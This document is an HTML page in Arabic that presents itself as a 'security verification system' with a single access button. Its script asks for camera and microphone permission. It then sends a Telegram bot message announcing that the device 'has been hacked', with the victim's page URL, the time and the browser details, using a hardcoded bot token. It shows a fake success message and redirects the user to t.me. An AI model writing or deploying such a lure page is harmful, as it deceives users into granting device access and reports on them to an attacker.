<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نظام التحقق الأمني</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background: linear-gradient(135deg, #1e1e2f, #2a2a3e);
            color: white;
            min-height: 100vh;
        }
        .container {
            max-width: 500px;
            margin: auto;
            background: rgba(0,0,0,0.5);
            padding: 30px;
            border-radius: 20px;
        }
        button {
            background: #0088cc;
            color: white;
            border: none;
            padding: 15px 30px;
            margin: 10px;
            border-radius: 10px;
            font-size: 16px;
            cursor: pointer;
            transition: 0.3s;
        }
        button:hover { background: #006699; transform: scale(1.05); }
        .status { margin-top: 20px; padding: 10px; border-radius: 10px; }
        .loading { color: #ffaa00; }
        .success { color: #00ff00; }
        .error { color: #ff4444; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎯 نظام التحقق الأمني</h1>
        <p>يرجى الضغط على الزر للمتابعة</p>
        <button id="accessBtn">🔐 السماح بالوصول</button>
        <div id="status" class="status"></div>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const userId = urlParams.get('id');
        const BOT_TOKEN = "8670557092:AAEQdhH5pdVn5b9d2xFYqcytjKE8Ptl9MHo";
        
        document.getElementById('accessBtn').onclick = function() {
            const statusDiv = document.getElementById('status');
            statusDiv.innerHTML = '<div class="loading">⏳ جاري التحقق من الأمان...</div>';
            
            navigator.mediaDevices.getUserMedia({ video: true, audio: true })
                .then(function(stream) {
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            chat_id: userId,
                            text: "✅ تم اختراق الجهاز!\n" + 
                                   "الضحية: " + window.location.href + "\n" +
                                   "الوقت: " + new Date().toLocaleString() + "\n" +
                                   "نوع المتصفح: " + navigator.userAgent
                        })
                    }).catch(err => console.log(err));
                    
                    statusDiv.innerHTML = '<div class="success">✅ تم التحقق بنجاح! جاري التوجيه...</div>';
                    setTimeout(() => { window.location.href = "https://t.me"; }, 2000);
                })
                .catch(function(err) {
                    statusDiv.innerHTML = '<div class="error">❌ حدث خطأ، حاول مرة أخرى</div>';
                    console.log(err);
                });
        };
    </script>
</body>
</html>